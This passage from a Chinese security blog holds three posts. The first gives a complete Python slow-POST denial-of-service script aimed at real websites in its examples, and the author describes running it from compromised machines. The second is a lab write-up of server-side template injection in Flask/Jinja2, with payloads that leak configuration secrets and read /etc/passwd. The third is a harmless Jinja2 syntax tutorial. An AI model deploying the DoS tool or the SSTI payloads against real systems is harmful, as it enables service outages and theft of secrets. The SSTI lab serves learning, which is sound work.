class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">#python3.6</span><br><span class="line"></span><br><span class="line">#用例：python ddos.py -w &quot;www.hao123.com&quot; -p 80 -n 200 --page &quot;/&quot;</span><br><span class="line">#-h查看帮助</span><br><span class="line">#-w参数和-p参数不可缺省</span><br><span class="line"></span><br><span class="line">import optparse</span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">socks=[]</span><br><span class="line"></span><br><span class="line">def conn_thread(PORT,HOST,data2,MAX_CONN):</span><br><span class="line">    global socks</span><br><span class="line">    for i in range(0,MAX_CONN):</span><br><span class="line">        s=socket.socket (socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        try:</span><br><span class="line">            s.connect((HOST,PORT))</span><br><span class="line">            s.send(data2)</span><br><span class="line">            print(&quot;[+] Send data OK!,conn=%d\n&quot; % i)</span><br><span class="line">            socks.append(s)</span><br><span class="line">        except:</span><br><span class="line">            print (&quot;[-] Could not connect to server or send error&quot;)</span><br><span class="line">            time.sleep(5)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def send_thread():</span><br><span class="line">    global socks</span><br><span class="line">    while True:</span><br><span class="line">        for s in socks:</span><br><span class="line">            try:</span><br><span class="line">                s.send(b&quot;f&quot;)</span><br><span class="line">                print (&quot;[+] send OK! %s&quot;%s)</span><br><span class="line">            except:</span><br><span class="line">                print (&quot;[-] send error\n&quot;)</span><br><span class="line">                socks.remove(s)</span><br><span class="line">                s.close()</span><br><span class="line">        time.sleep(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    MAX_CONN = 10</span><br><span class="line">    PORT = 80</span><br><span class="line">    HOST = &quot;www.baidu.com&quot;</span><br><span class="line">    PAGE = &quot;/&quot;</span><br><span class="line">    MAX_CONN = 10</span><br><span class="line"></span><br><span class="line">    parser = optparse.OptionParser()</span><br><span class="line">    parser.add_option(&apos;-w&apos;, dest=&apos;HOST&apos;, type=&apos;string&apos;, help=&quot;IP address or Website&quot;)</span><br><span class="line">    parser.add_option(&apos;-p&apos;, dest=&apos;PORT&apos;, type=&apos;int&apos;, help=&quot;Port num&quot;)</span><br><span class="line">    parser.add_option(&apos;-n&apos;, dest=&apos;MAX_CONN&apos;, type=&apos;int&apos;, help=&quot;Max connect num&quot;)</span><br><span class="line">    parser.add_option(&apos;--page&apos;, dest=&apos;PAGE&apos;, type=&apos;string&apos;, help=&quot;Url page&quot;)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    if(options.HOST==None)|(options.PORT==None):</span><br><span class="line">        print(&apos;---wrong input!---&apos;+&apos;\n&apos;)</span><br><span class="line">        exit(0)</span><br><span class="line">    else:</span><br><span class="line">        HOST = options.HOST</span><br><span class="line">        PORT = options.PORT</span><br><span class="line">    if(options.PAGE):</span><br><span class="line">        PAGE = options.PAGE</span><br><span class="line">    if(options.MAX_CONN):</span><br><span class="line">        MAX_CONN = options.MAX_CONN</span><br><span class="line"></span><br><span class="line">    data = (&quot;POST %s HTTP/1.1\r\n&quot;</span><br><span class="line">            &quot;Host: %s\r\n&quot;</span><br><span class="line">            &quot;Content-Length: 1000000000\r\n&quot;</span><br><span class="line">            &quot;Cookie: ddos_test\r\n&quot;</span><br><span class="line">             &quot;\r\n&quot; % (PAGE, HOST))</span><br><span class="line">    print(&quot;****************************&quot;)</span><br><span class="line">    print(&quot;****************************&quot;)</span><br><span class="line">    print(data)</span><br><span class="line">    print(&quot;MAX_CONN=&#123;0&#125;&quot;.format(MAX_CONN))</span><br><span class="line">    print(&quot;****************************&quot;)</span><br><span class="line">    print(&quot;****************************&quot;)</span><br><span class="line">    data2 = data.encode(&apos;utf-8&apos;)</span><br><span class="line">    time.sleep(5)</span><br><span class="line">    conn_th=threading.Thread(target=conn_thread,args=(PORT,HOST,data2,MAX_CONN))</span><br><span class="line">    send_th=threading.Thread(target=send_thread,args=())</span><br><span class="line">    conn_th.start()</span><br><span class="line">    send_th.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ ==&apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>我们通过optparse库读取命令行输入参数，其中host和port是必要参数，max_conn和page是可选参数。</p>
<p>效果如下：</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/python_ddos/ddos02.png" alt=""></p>
<p>我们植入肉鸡后，就可以通过命令行调用程序并选择攻击目标了。</p>
<h2 id="0x04-其他"><a href="#0x04-其他" class="headerlink" title="0x04 其他"></a>0x04 其他</h2><p>blog中所有写好的工具，以及常用的木马、字典，都放在<br><a href="https://github.com/echohun/tools" target="_blank" rel="noopener">https://github.com/echohun/tools</a> 感兴趣的大佬们可以star一下，十分感激。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/28/SSTI服务器模板注入/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/05/28/SSTI服务器模板注入/" itemprop="url">
                  SSTI服务器模板注入
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-28T23:17:58+08:00">
                2018-05-28
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/05/28/SSTI服务器模板注入/" class="leancloud_visitors" data-flag-title="SSTI服务器模板注入">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前段时间打本校的ctf，有道叫幸运数字的题，只挖到一个xss，看了很久对题完全没有头绪，后来交wp的时候，出题师傅在群里说是SSTI，然后就去百度了一下，复现并学习一下这个漏洞。</p>
<h2 id="0x01-SSTI服务端模板注入"><a href="#0x01-SSTI服务端模板注入" class="headerlink" title="0x01 SSTI服务端模板注入"></a>0x01 SSTI服务端模板注入</h2><p>服务端模板注入是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
<p>通常测试模块类型的方式如下图：</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssti/ssti01.png" alt=""></p>
<h2 id="0x02-环境配置"><a href="#0x02-环境配置" class="headerlink" title="0x02 环境配置"></a>0x02 环境配置</h2><p>前面两篇正好写了python的后端模块flask和jinja2，这次我们使用flask+jinja2框架来测试一下。</p>
<p>首先后端是python，所以需要python环境，python在官网下载并安装，配置环境变量即可。</p>
<p>接着我们安装需要用到的库</p>
<ul>
<li>pip install jinja2</li>
<li>pip install flask</li>
<li>pip install virtualenv</li>
</ul>
<p>只要上述所有库成功安装，环境就配置完毕了。</p>
<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>我们的环境需要一个run.py文件和一个templates文件夹，templates文件夹内要有一个index.html。</p>
<p>index.html内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&#123;% block title %&#125;test pages&#123;% endblock %&#125;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;center&gt;</span><br><span class="line">			&lt;p&gt;请输入你的昵称&lt;/p&gt;</span><br><span class="line">			&lt;form method=&quot;post&quot; action=&quot;/check&quot;&gt;</span><br><span class="line"></span><br><span class="line">			&lt;p&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;name&quot; required&gt;</span><br><span class="line">			&lt;/p&gt;</span><br><span class="line">			&lt;br&gt;</span><br><span class="line">			&lt;p&gt;</span><br><span class="line">			&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class="line">			&lt;/p&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">	&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以看到，html中只有一个post型的from需要我们填写提交。</p>
<p>然后是run.py（注意这次我用了python2.7）:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#python2.7</span><br><span class="line">import jinja2</span><br><span class="line">from flask import Flask,render_template, render_template_string, flash, redirect, url_for, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.from_object(__name__)</span><br><span class="line">app.config[&apos;SECRET_KEY&apos;] = &quot;password:123456789&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&apos;index.html&apos;)</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/check&apos;,methods=[&apos;POST&apos;, &apos;GET&apos;])</span><br><span class="line">def check():</span><br><span class="line">	if request.method == &apos;POST&apos;:</span><br><span class="line">		name = str(request.form[&apos;name&apos;])</span><br><span class="line">		template = u&apos;&apos;&apos;</span><br><span class="line">		&lt;center&gt;</span><br><span class="line">			&lt;p&gt;你好, %s, 欢迎来到我的页面&lt;/p&gt;</span><br><span class="line">			&lt;a href=&quot;/&quot;&gt;点这里退出&lt;/a&gt;</span><br><span class="line">		&lt;/center&gt;</span><br><span class="line">		&apos;&apos;&apos; % (name)</span><br><span class="line">		return render_template_string(template)</span><br><span class="line">		</span><br><span class="line">@app.errorhandler(404)</span><br><span class="line">def page_not_found(e):</span><br><span class="line">	return render_template(&apos;404.html&apos;),404</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></p>
<p>这里python文件实现了将几个页面通过jinja2模块渲染部署，然后添加了一个敏感数据SECRET_KEY一会用得到，剩下的就是将index.html页面post过来的name，在网站check路径的页面中作为字符串输出。</p>
<p>我们在run.py目录打开命令行先输入python run.py先将服务运行起来：</p>
<p>然后我们打开浏览器输入127.0.0.1:5000，成功显示index.html中的页面：</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssti/ssti02.png" alt=""></p>
<p>我们输入任意字符串，浏览器跳转到127.0.0.1:5000/check目录，并且在网页中输出我们的字符串：</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssti/ssti03.png" alt=""></p>
<p>如上几步如果都成功，我们漏洞环境就搭建完成了。</p>
<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>我们先尝试一下刚才图中的测试数据，输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*&apos;7&apos;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>发现结果如下：</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssti/ssti04.png" alt=""></p>
<p>config是Flask模版中的一个全局对象，它代表“当前配置对象(flask.config)”，它是一个类字典的对象，它包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY等敏感值。查看这些配置项目，我们只需注入如下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.items() &#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>发现结果中存在我们刚才故意放进去的敏感信息：</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssti/ssti05.png" alt=""></p>
<p>在接下来的步骤之前，我先介绍两个内省实用程序：<strong>mro</strong>以及<strong>subclasses</strong>属性。</p>
<p><strong>mro</strong>中的MRO(Method Resolution Order)代表着解析方法调用的顺序，它是每个对象元类的一个隐藏属性，当进行内省时会忽略dir输出。</p>
<p><strong>subclasses</strong>属性在这里作为一种方法被定义为，对每个new-style class“为它的直接子类维持一个弱引用列表”，之后“返回一个包含所有存活引用的列表”。</p>
<p><strong>mro</strong>允许我们在当前Python环境中追溯对象继承树，之后<strong>subclasses</strong>又让我们回到原点。从一个new-style object开始，例如str类型。使用<strong>mro</strong>我们可以从继承树爬到根对象类，之后在Python环境中使用<strong>subclasses</strong>爬向每一个new-style object。ok，这让我们能够访问加载到当前Python环境下的所有类。这样，我们就可以实现很多功能。</p>
<p>首先我们要做的第一件事便是选择一个new-style object用于访问object基类。我们可以使用<strong>mro</strong>属性访问对象的继承类。<br>输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__ &#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssti/ssti06.png" alt=""></p>
<p>得到反馈只有str、basestring和object，按照数组的排序，我们应该选<strong>mro</strong>的第三个，也就是<strong>mro</strong>[2]，接下来我们构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__() &#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssti/ssti07.png" alt=""></p>
<p>可以查看到非常非常多的可访问类，这个时候我们要找到<type 'file'="">类，它是文件系统访问的关键。</type></p>
<p>然后我们可以用file类的read()方法访问一下当前目录的文本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;./2333.txt&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssti/ssti08.png" alt=""></p>
<p>访问敏感目录可以得到很多信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/passwd&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssti/ssti09.png" alt=""></p>
<p>我们就可以参考目标系统目录结构，对目标系统敏感文件进行访问。</p>
<h2 id="0x05-参考资料"><a href="#0x05-参考资料" class="headerlink" title="0x05 参考资料"></a>0x05 参考资料</h2><ul>
<li><a href="https://portswigger.net/blog/server-side-template-injection" target="_blank" rel="noopener">https://portswigger.net/blog/server-side-template-injection</a></li>
<li><a href="http://www.freebuf.com/articles/web/98619.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/98619.html</a></li>
<li><a href="https://nvisium.com/blog/2015/12/07/injecting-flask/" target="_blank" rel="noopener">https://nvisium.com/blog/2015/12/07/injecting-flask/</a></li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/28/python-jinja2模块学习/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/05/28/python-jinja2模块学习/" itemprop="url">
                  python-jinja2模块学习
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-28T11:17:25+08:00">
                2018-05-28
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                
                  ， 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python/笔记/" itemprop="url" rel="index">
                    <span itemprop="name">笔记</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/05/28/python-jinja2模块学习/" class="leancloud_visitors" data-flag-title="python-jinja2模块学习">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>上次总结了python flask模板，flask模板是一个包含响应文本的文件，其中包含用占位变量表示的动态部分，其具体指只在请求的上下文中才能知道。使用真是只替换变量，再返回最终得到的响应字符串，这一过程称为渲染。为了渲染模板，Flask使用了一个名为Jinja2的强大模板引擎。这次记录一下jinja2模块的学习，用作笔记。</p>
<h2 id="0x01-jinja2"><a href="#0x01-jinja2" class="headerlink" title="0x01 jinja2"></a>0x01 jinja2</h2><p>Jinja2是基于python的模板引擎，功能比较类似于于PHP的smarty，J2ee的Freemarker和velocity。 它能完全支持unicode，并具有集成的沙箱执行环境。jinja2使用BSD授权。起初是Flask作者模仿django模板的一个模板引擎，为Flask提供模板支持，由于其灵活，快速和安全等优点被广泛使用。</p>
<h2 id="0x02-安装"><a href="#0x02-安装" class="headerlink" title="0x02 安装"></a>0x02 安装</h2><p>python库的安装都十分方便，jinja2也不例外，我们直接在命令行输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install jinja2</span><br></pre></td></tr></table></figure></p>
<p>即可安装。</p>
<h2 id="0x03-基本语法"><a href="#0x03-基本语法" class="headerlink" title="0x03 基本语法"></a>0x03 基本语法</h2><p>在jinja2中，存在三种语法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">控制结构 &#123;% %&#125;</span><br><span class="line">变量取值 &#123;&#123; &#125;&#125;</span><br><span class="line">注释 &#123;# #&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="0x04-变量"><a href="#0x04-变量" class="headerlink" title="0x04 变量"></a>0x04 变量</h2><p>jinja2模板中使用两个花括号嵌套 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等。</p>
<p>如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;this is a dicectory:&#123;&#123; mydict[&apos;key&apos;] &#125;&#125; &lt;/p&gt;</span><br><span class="line">&lt;p&gt;this is a list:&#123;&#123; mylist[3] &#125;&#125; &lt;/p&gt;</span><br><span class="line">&lt;p&gt;this is a object:&#123;&#123; myobject.something() &#125;&#125; &lt;/p&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="0x05-过滤器"><a href="#0x05-过滤器" class="headerlink" title="0x05 过滤器"></a>0x05 过滤器</h2><p>花括号中的变量传输进来时，我们要对其进行一些对字符串的常规操作或者提升安全性的操作，这个时候可以使用jinja2自带的过滤器。</p>
<p>常用的过滤器：</p>
<table>
<thead>
<tr>
<th>过滤器</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>safe</td>
<td>渲染时值不转义</td>
</tr>
<tr>
<td>capitialize</td>
<td>把值的首字母转换成大写，其他子母转换为小写</td>
</tr>
<tr>
<td>lower</td>
<td>把值转换成小写形式 </td>
</tr>
<tr>
<td>upper</td>
<td>把值转换成大写形式 </td>
</tr>
<tr>
<td>title</td>
<td>把值中每个单词的首字母都转换成大写</td>
</tr>
<tr>
<td>trim</td>
<td>把值的首尾空格去掉</td>
</tr>
<tr>
<td>striptags</td>
<td>渲染之前把值中所有的HTML标签都删掉</td>
</tr>
<tr>
<td>join</td>
<td>拼接多个值为字符串</td>
</tr>
<tr>
<td>replace</td>
<td>替换字符串的值</td>
</tr>
<tr>
<td>round</td>
<td>默认对数字进行四舍五入，也可以用参数进行控制</td>
</tr>
<tr>
<td>int</td>
<td>把值转换成整型</td>
</tr>
</tbody>
</table>
<p>过滤器的用法是在变量后面使用管道(|)分割，多个过滤器可以链式调用，前一个过滤器的输出会作为后一个过滤器的输入。</p>
<p>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;abc&apos; | upper  &#125;&#125;</span><br><span class="line"># ABC</span><br><span class="line">&#123;&#123; &apos;hello world&apos; | title  &#125;&#125;</span><br><span class="line"># Hello World</span><br><span class="line">&#123;&#123; 18.18 | round | int &#125;&#125;</span><br><span class="line"># 18</span><br></pre></td></tr></table></figure></p>
<h2 id="0x06-分支"><a href="#0x06-分支" class="headerlink" title="0x06 分支"></a>0x06 分支</h2><p>jinja2中的if语句类似与Python的if语句，它也具有单分支，多分支等多种结构，不同的是，条件语句不需要使用冒号结尾，而结束控制语句，需要使用endif关键字。</p>
<p>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if grade&gt;=90 %&#125;</span><br><span class="line">excellent</span><br><span class="line">&#123;% elif grade&gt;=60 %&#125;</span><br><span class="line">great</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">bad</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="0x07-循环"><a href="#0x07-循环" class="headerlink" title="0x07 循环"></a>0x07 循环</h2><p>jinja2中的for循环用于迭代Python的数据类型，包括列表，元组和字典。在jinja2中不存在while循环。</p>
<p>迭代列表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">&#123;% for user in users %&#125;</span><br><span class="line">&lt;li&gt;&#123;&#123; user.username|title &#125;&#125;&lt;/li&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure></p>
<p>迭代字典<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;dl&gt;</span><br><span class="line">&#123;% for key, value in my_dict.iteritems() %&#125;</span><br><span class="line">&lt;dt&gt;&#123;&#123; key &#125;&#125;&lt;/dt&gt;</span><br><span class="line">&lt;dd&gt;&#123;&#123; value&#125;&#125;&lt;/dd&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&lt;/dl&gt;</span><br></pre></td></tr></table></figure></p>
<p>在for循环中，jinja2还提供了一些特殊的变量，用以来获取当前的遍历状态：</p>
<table>
<thead>
<tr>
<th>变量</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>loop.index</td>
<td>当前迭代的索引（从1开始）</td>
</tr>
<tr>
<td>loop.index0</td>
<td>当前迭代的索引（从0开始）</td>
</tr>
<tr>
<td>loop.first</td>
<td>是否是第一次迭代，返回bool</td>
</tr>
<tr>
<td>loop.last</td>
<td>是否是最后一次迭代，返回bool</td>
</tr>
<tr>
<td>loop.length</td>
<td>序列中的项目数量</td>
</tr>
<tr>
<td>loop.revindex</td>
<td>到循环结束的次数（从1开始）</td>
</tr>
<tr>
<td>loop.revindex0</td>
<td>到循环结束的次数(从0开始）</td>
</tr>
</tbody>
</table>
<h2 id="0x08-宏"><a href="#0x08-宏" class="headerlink" title="0x08 宏"></a>0x08 宏</h2><p>宏类似于Python中的函数（其实就是函数的用法），我们在宏中定义行为，还可以进行传递参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% macro input(name,age=18) %&#125;</span><br><span class="line"> &lt;input type=&apos;text&apos; name=&quot;&#123;&#123; name &#125;&#125;&quot; value=&quot;&#123;&#123; age &#125;&#125;&quot; &gt;</span><br><span class="line">&#123;% endmacro %&#125;</span><br></pre></td></tr></table></figure>
<p>调用:</p>
